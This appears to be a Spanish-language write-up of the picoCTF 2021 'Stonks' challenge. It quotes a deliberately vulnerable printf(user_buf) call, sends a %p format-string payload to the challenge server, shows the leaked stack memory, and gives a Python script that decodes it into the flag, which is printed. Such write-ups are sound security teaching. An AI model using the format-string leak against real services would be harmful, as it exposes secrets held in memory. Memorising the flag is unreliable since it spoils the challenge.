## Descripción
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

## Pistas
- Okay, maybe I'd believe you if you find my API key.

## Solución
Al rastrear la ejecución a través de la primera opción, detectamos un bloque interesante dentro de la `buy_stonks()`función:

```c()
char *user_buf = malloc(300 + 1); printf("What is your API token?\n"); scanf("%300s", user_buf); printf("Buying stonks with token:\n"); printf(user_buf);
```

- Vulnerabilidad de cadena de formato en la mano, profundicemos un poco más en el código. Mirando cerca del comienzo de la `buy_stonks()`función, notamos lo que parece ser el archivo de bandera que se carga y su contenido se copia en un búfer en la pila

```bash()
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p
Buying stonks with token:
0x97903b0__0x804b000__0x80489c3__0xf7f2ed80__0xffffffff__0x1__0x978e160__0xf7f3c110__0xf7f2edc7__(nil)__0x978f180__0x1__0x9790390__0x97903b0__0x6f636970__0x7b465443__0x306c5f49__0x345f7435__0x6d5f6c6c__0x306d5f79__0x5f79336e__0x35386130__0x32356533__0xffbb007d__0xf7f69af8__0xf7f3c440__0x50fbaa00__0x1
Portfolio as of Mon May 15 18:36:42 UTC 2023


1 shares of S
1 shares of I
10 shares of OZ
10 shares of DENR
6 shares of G
1613 shares of GKS
Goodbye!

```

- Los guiones bajos son simplemente para hacer que la salida sea más fácil de analizar
```
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
```

- Vemos lo que parece ASCII comenzando en el lugar 15. Si descodificamos rápidamente los cuatro bytes (teniendo en cuenta el little-endian), obtenemos la cadena "pico". Podemos copiar todo, desde el primer bloque de bytes ASCII hasta el bloque que contiene un byte nulo y hacer un poco de magia de Python:

```python()
from binascii import unhexlify

flag = b"".join(
    [
        unhexlify("6f636970")[::-1],
        unhexlify("7b465443")[::-1],
        unhexlify("306c5f49")[::-1],
        unhexlify("345f7435")[::-1],
        unhexlify("6d5f6c6c")[::-1],
        unhexlify("306d5f79")[::-1],
        unhexlify("5f79336e")[::-1],
        unhexlify("35386130")[::-1],
        unhexlify("32356533")[::-1],
        unhexlify("007d")[::-1],
    ]
).decode()

print(flag)
```

```
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
```

## Notas adicionales
- Sin notas adicionales 

## Referencias
- [Stonks](https://www.c0dedead.io/picoctf-2021-stonks/)